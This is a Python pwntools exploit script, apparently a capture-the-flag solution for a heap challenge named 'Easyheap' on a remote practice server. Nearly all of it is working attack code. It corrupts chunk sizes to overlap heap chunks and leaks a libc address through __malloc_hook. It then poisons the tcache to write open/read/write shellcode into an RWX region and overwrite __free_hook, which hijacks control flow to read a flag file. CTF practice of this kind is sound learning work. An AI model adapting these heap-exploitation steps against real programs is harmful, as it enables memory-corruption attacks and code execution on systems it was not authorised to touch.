# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './Easyheap'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25511'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>> :',num)

def add(size,content):
    cmd(1)
    sla("Size",size)
    sa("Content:",content)

def delete(id):
    cmd(2)
    sla("Index:",id)

def show(id):
    cmd(3)
    sla("Index:",id)

def edit(id,content):
    cmd(4)
    sla("Index:",id)
    sa("Content:",content)

one_gad = one_gadget(libc.path)

add(0x500,"a")

add(0x300,"a"*0x300)
add(0x230,"a"*0x230)

add(0x80,"a")

payload = "a"*0x10 + p64(0) + p64(0x310 + 0x240 + 1)

edit(0,payload)
delete(1)
add(0x300,"a"*0x300)

show(2)

__malloc_hook = l64() - 0x70
lg("__malloc_hook",__malloc_hook)

libc.address = __malloc_hook - libc.sym["__malloc_hook"]
__free_hook = libc.sym["__free_hook"]

rwx = 0x23330000

orw = shellcraft.open("/flag")
orw += shellcraft.read( 3, rwx+0x500 ,100 )
orw += shellcraft.write( 1, rwx+0x500 ,100 )
orw = asm(orw)


add(0x100,"a")
add(0x100,"a"*0x100)
add(0x100,"a"*0x100)

delete(6)
delete(5)

payload = "a"*0x10 + p64(0) + p64(0x111) + p64(rwx)
edit(4,payload)

add(0x100,"a"*0x100)
print(orw)
add(0x100,"a"*0x100)
edit(6,orw.ljust(0x100,"\x00"))

add(0x18,"a")
add(0x18,"a")

delete(8)
delete(7)

payload = "a"*0x10 + p64(0) + p64(0x21) + p64(__free_hook)
edit(3,payload)

add(0x18 , "a"*0x8)
add(0x18 , "a"*0x8)

edit(8,p64(rwx))

delete(5)

p.interactive()



'''
@File    :   Easyheap.py
@Time    :   2021/07/31 11:19:05
@Author  :   Niyah 
'''